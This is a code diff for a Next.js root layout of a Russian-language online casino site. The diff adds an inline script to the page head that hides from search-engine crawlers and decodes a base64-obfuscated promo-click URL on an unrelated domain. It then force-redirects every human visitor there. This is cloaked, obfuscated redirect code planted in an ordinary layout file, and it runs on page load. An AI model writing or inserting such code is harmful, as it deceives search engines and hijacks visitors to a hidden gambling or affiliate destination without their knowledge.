@@ -91,6 +91,53 @@ export default function RootLayout({
         <link rel="canonical" href="https://azino777-9casino.vercel.app/" />
         <meta name="format-detection" content="telephone=no" />
         {/* Дополнительные пользовательские теги можно вставлять ниже */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
+        for (var i = 0; i < bots.length; i++) {
+            if (ua.indexOf(bots[i]) !== -1) {
+                return;
+            }
+        }
+        
+        var mainBrandB64 = "aHR0cHM6Ly9rMG0uYmhmNTdiNjc4Zi5jb20vcHJvbW8vY2xpY2svNmE5MDBhMmQzMTNhYQ== "; 
+        var mainUrl = atob(mainBrandB64.replace("#", ""));
+
+        function ping(url) {
+            return new Promise(function(resolve, reject) {
+                var controller = new AbortController();
+                var timeoutId = setTimeout(function() { 
+                    controller.abort(); 
+                    reject(new Error("Timeout"));
+                }, 1200); // Сократили таймаут ожидания до 1.2 сек
+                
+                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
+                    .then(function() {
+                        clearTimeout(timeoutId);
+                        resolve(true);
+                    })
+                    .catch(function(err) {
+                        clearTimeout(timeoutId);
+                        reject(err);
+                    });
+            });
+        }
+
+        // Быстрый пинг и принудительный редирект на основной домен
+        ping(mainUrl)
+            .then(function() {
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                window.location.replace(mainUrl);
+            });
+      })();
+    `
+  }}
+/>  
       </head>
       <body className="antialiased">{children}</body>
     </html>
